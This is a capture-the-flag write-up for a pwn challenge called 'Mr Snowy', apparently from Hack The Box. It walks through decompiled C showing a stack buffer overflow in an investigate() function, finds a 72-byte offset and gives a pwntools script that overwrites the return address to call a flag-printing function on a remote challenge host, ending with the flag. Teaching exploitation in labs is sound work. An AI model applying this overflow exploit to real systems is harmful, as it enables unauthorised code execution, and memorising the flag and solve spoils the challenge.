# Mr Snowy [ Pwn ]

![image](https://user-images.githubusercontent.com/56447720/144405133-fce67fce-1a26-4b8c-8d1d-4700f372a297.png)

## Solution

### Checksec

![image](https://user-images.githubusercontent.com/56447720/144418184-a7ce15ee-4cc8-4ffa-a5b3-681002b860b7.png)

- The `NX` is enabled which makes the stack unexecutabble
- THe `PIE` is disabled so we dont have to find the address
- The binary is just a simple bufferoverflow

### Functions of the binary has

![image](https://user-images.githubusercontent.com/56447720/144419529-fa60777f-2ee8-4d72-acd0-99e7cd4d7aba.png)


### Main function

![image](https://user-images.githubusercontent.com/56447720/144418082-2035b197-9a54-474e-badf-c758bd8127fa.png)


- The main funciton after executing calls 3 functions , let's checkout the snowman function

#### It's quiet difficult to do the task only with asm , I've used Ghidra which has a feature of converting ( almost same ) asm back to the original C code

### Snowman Function

```c

void snowman(void)

{
  int iVar1;
  char local_48 [64];
  
  printstr("\n[*] This snowman looks sus..\n\n1. Investigate 🔎\n2. Let it be   ⛄\n> ");
  fflush(stdout);
  read(0,local_48,2);
  iVar1 = atoi(local_48);
  if (iVar1 != 1) {
    printstr("[*] It\'s just a cute snowman after all, nothing to worry about..\n");
    color("\n[-] Mission failed!\n",&DAT_0040161a,&DAT_00401664);
                    /* WARNING: Subroutine does not return */
    exit(-0x45);
  }
  investigate();
  return;
}


```
- This code is basically the first part 
     ![image](https://user-images.githubusercontent.com/56447720/144408636-c805745e-25eb-48a5-8e07-4c83074d5f97.png)

- When option `1` is selected it calls antoher funtion : `investigate()`

### Inverstigate Function

```c

void investigate(void)

{
  int iVar1;
  char local_48 [64];
  
  fflush(stdout);
  printstr(
          "\n[!] After some investigation, you found a secret camera inside the snowman!\n\n1.Deactivate ⚠\xfe0f\n2. Break it   🔨\n> "
          );
  fflush(stdout);
  read(0,local_48,0x108);
  iVar1 = atoi(local_48);
  if (iVar1 == 1) {
    puts("\x1b[1;31m");
    printstr("[!] You do not know the password!\n[-] Mission failed!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x16);
  }
  iVar1 = atoi(local_48);
  if (iVar1 == 2) {
    puts("\x1b[1;31m");
    printstr(
            "[!] This metal seems unbreakable, the elves seem to have put a spell on it..\n[-]Mission failed!\n"
            );
                    /* WARNING: Subroutine does not return */
    exit(0x16);
  }
  fflush(stdout);
  puts("\x1b[1;31m");
  fflush(stdout);
  puts("[-] Mission failed!");
  fflush(stdout);
  return;
}

```
### There's another function named `deactivate camera`

```c

void deactivate_camera(void)

{
  char acStack104 [48];
  FILE *local_38;
  char *local_30;
  undefined8 local_28;
  int local_1c;
  
  local_1c = 0x30;
  local_28 = 0x2f;
  local_30 = acStack104;
  local_38 = fopen("flag.txt","rb");
  if (local_38 == (FILE *)0x0) {
    fwrite("[-] Could not open flag.txt, please conctact an Administrator.\n",1,0x3f,stdout);
                    /* WARNING: Subroutine does not return */
    exit(-0x45);
  }
  fgets(local_30,local_1c,local_38);
  puts("\x1b[1;32m");
  fwrite("[+] Here is the secret password to deactivate the camera: ",1,0x3a,stdout);
  puts(local_30);
  fclose(local_38);
  return;
}

```


## Overflow

- So we basically have to find the offset in investigation function, overflow it and set the `$rip` ( Instruction pointter ) to `deactivate_camera` function

- Find OFFSET
- Set breakpoint at `exit` in `investigate()` [ address of exit : 0x00000000004013ea ] and create a pattern to find offset

![image](https://user-images.githubusercontent.com/56447720/144418424-fcdf5250-a4ce-4edc-bda1-91df1c306755.png)

 - Run the program , give option `1` to go in `investigate` function

![image](https://user-images.githubusercontent.com/56447720/144418694-e1b7f129-2354-4377-b280-af26893a00cb.png)
 
- This is how stack will look when we hit our breakpoint

![image](https://user-images.githubusercontent.com/56447720/144416069-49db01c2-1f83-4bd7-a0f1-c340cb49f6e1.png)


![image](https://user-images.githubusercontent.com/56447720/144418590-d00fa329-4da0-4700-bcd5-dc64a899d5ae.png)

- So the OFFSET is 72 

## Exploit

- Send buffer of 72 characters
- Add the addresss of `deactivate camera` function
- Send the payload and get the flag

### Solve.py

```py
from pwn import *

# nc 134.209.30.250:30947
p = remote('134.209.30.250',30947)

payload = b'A'*72
payload += p64(0x00401165)

p.recv()
p.sendline(b'1')
p.recv()
p.sendline(payload)
p.interactive()
```
### Flag

![image](https://user-images.githubusercontent.com/56447720/144417152-21dc9cc1-5c83-4db1-830c-9f4db56e2360.png)

```bash
# Flag : HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}
```

